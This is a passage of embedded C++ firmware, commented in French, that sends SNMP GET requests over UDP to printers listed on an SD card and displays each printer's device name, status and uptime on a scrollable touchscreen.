  int vbLengthPos = pos++; // Placeholder for the length of this variable-binding

  // Add the OID
  packet[pos++] = 0x06; // OBJECT IDENTIFIER
  uint8_t encodedOID[32];
  int encodedLen = encodeOID(oid, encodedOID, sizeof(encodedOID));
  if (encodedLen < 0) return false;
  packet[pos++] = encodedLen; // Length of OID
  memcpy(&packet[pos], encodedOID, encodedLen);
  pos += encodedLen;

  // Add the value (NULL)
  packet[pos++] = 0x05; // NULL
  packet[pos++] = 0x00; // Length of NULL

  // Calculate the length of the single variable-binding
  packet[vbLengthPos] = pos - vbLengthPos - 1;

  // Calculate the length of the variable-binding sequence
  packet[vbSequenceLengthPos] = pos - vbSequenceLengthPos - 1;

  // Update the PDU and SNMP message lengths
  packet[pduLengthPos] = pos - pduLengthPos - 1;
  packet[lengthPos] = pos - lengthPos - 1;

  /*// Debug: Print the packet being sent
    Serial.println("[DEBUG] Sending SNMP Packet:");
    for (int i = 0; i < pos; i++) {
      Serial.printf("%02X ", packet[i]);
    }
    Serial.println();*/

  // Envoi du paquet
  udp.beginPacket(printerIP, SNMP_PORT);
  udp.write(packet, pos);
  udp.endPacket();

  // Attente de la réponse
  uint32_t startTime = millis();
  while (millis() - startTime < 1000) {
    int packetSize = udp.parsePacket();
    if (packetSize) {
      uint8_t buffer[255];
      udp.read(buffer, sizeof(buffer));

      /*// Debug : afficher le paquet reçu
        Serial.println("[DEBUG] Received SNMP Response:");
        for (int i = 0; i < packetSize; i++) {
          Serial.printf("%02X ", buffer[i]);
        }
        Serial.println();*/

      // Appel à une fonction de parsing BER-SNMP (à implémenter ou à inclure d'une librairie)
      String parsedValue;
      if (parseSNMPResponse(buffer, packetSize, parsedValue)) {
        response = parsedValue;
      } else {
        response = F("Parsing error");
      }

      return true;
    }
  }

  return false;
}

void checkPrinterStatus() {
  int displayStart = 0;
  int lineHeight = 12;
  int maxLines = tft.height() / lineHeight;
  bool needsDisplayUpdate = true;

  if (WiFi.localIP().toString() == "0.0.0.0") {
    Serial.println("[INFO] Not connected to a network.");
    return;
  }

  // On prépare notre vecteur de lignes à afficher
  std::vector<String> printerLines;
  printerLines.reserve(50); // Par exemple, on réserve un peu d'espace

  // Chemin de config
  String printerConfigPath = "/Printer/PrinterIp.txt";
  std::vector<IPAddress> printerIPs;

  // Lecture du fichier IP
  if (SD.exists(printerConfigPath)) {
    File config = SD.open(printerConfigPath);
    if (config) {
      while (config.available()) {
        String line = config.readStringUntil('\n');
        line.trim();
        IPAddress ip;
        if (ip.fromString(line)) {
          printerIPs.push_back(ip);
        }
      }
      config.close();
    }
  }

  if (printerIPs.empty()) {
    Serial.println("[INFO] No printers detected or configured.");
    printerIPs = detectedPrinters;

  }

  // OIDs SNMP
  const char* deviceOid = "1.3.6.1.2.1.25.3.2.1.3.1";
  const char* statusOid = "1.3.6.1.2.1.25.3.2.1.5.1";
  const char* uptimeOid = "1.3.6.1.2.1.1.3.0";

  // Pour chaque imprimante
  for (const auto& printerIP : printerIPs) {
    String device = "Unknown";
    String status = "Unknown";
    String uptime = "Unknown";

    bool okDevice = sendSNMPRequest(printerIP, deviceOid, device);
    bool okStatus = sendSNMPRequest(printerIP, statusOid, status);
    bool okUptime = sendSNMPRequest(printerIP, uptimeOid, uptime);

    printerLines.push_back("-----------------------");
    printerLines.push_back(printerIP.toString());
    printerLines.push_back("-----------------------");

    // DEVICE
    if (okDevice) {
      printerLines.push_back(device);
      Serial.printf("[INFO] %s => Device: %s\n",
                    printerIP.toString().c_str(),
                    device.c_str());
    } else {
      printerLines.push_back("Device: Error");
      Serial.printf("[ERROR] %s => Device fetch failed\n",
                    printerIP.toString().c_str());
    }

    // STATUS
    if (okStatus) {
      // Convertir la valeur (1..5) en chaîne
      if (status.equals("1"))      status = "Unknown";
      else if (status.equals("2")) status = "Running";
      else if (status.equals("3")) status = "Warning";
      else if (status.equals("4")) status = "Testing";
      else if (status.equals("5")) status = "Down";
      else                         status = "Other";

      printerLines.push_back(status);
      Serial.printf("[INFO] %s => Status: %s\n",
                    printerIP.toString().c_str(),
                    status.c_str());
    } else {
      printerLines.push_back("Status: Error");
      Serial.printf("[ERROR] %s => Status fetch failed\n",
                    printerIP.toString().c_str());
    }

    if (okUptime) {
      // Si par ex. "113021400 (raw ticks)"
      if (uptime.endsWith("(raw ticks)")) {
        int spaceIndex = uptime.indexOf(' ');
        if (spaceIndex > 0) {
          String ticksStr = uptime.substring(0, spaceIndex);
          uint32_t ticksVal = ticksStr.toInt();

          // Convert ticks in j/h/m/s
          uint32_t totalSeconds = ticksVal / 100;
          uint32_t days    = totalSeconds / 86400;
          uint32_t hours   = (totalSeconds % 86400) / 3600;
          uint32_t minutes = (totalSeconds % 3600) / 60;
          uint32_t seconds = totalSeconds % 60;

          char buff[64];
          snprintf(buff, sizeof(buff),
                   "%ud %02u:%02u:%02u", days, hours, minutes, seconds);
          uptime = String(buff);
        }
      }
      printerLines.push_back(uptime);
      Serial.printf("[INFO] %s => Uptime: %s\n",
                    printerIP.toString().c_str(),
                    uptime.c_str());
    } else {
      printerLines.push_back("Uptime: Error");
      Serial.printf("[ERROR] %s => Uptime fetch failed\n",
                    printerIP.toString().c_str());
    }
  }

  printerLines.push_back("-----------------------");
  printerLines.push_back("Scan Terminated.");
  printerLines.push_back("-----------------------");

  displayStart = 0; // on remet à zéro l'index de scroll
  needsDisplayUpdate = true;
  screenDebounce();
  while (true) {


    if (handleScrolling(displayStart, maxLines, printerLines.size())) {
      needsDisplayUpdate = true;
    }

    if (needsDisplayUpdate) {
      displayResults(displayStart, maxLines, printerLines);
      needsDisplayUpdate = false;
    }

    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
      break;
    }
    delay(50);
  }

  waitAndReturnToMenu("return to menu");
}
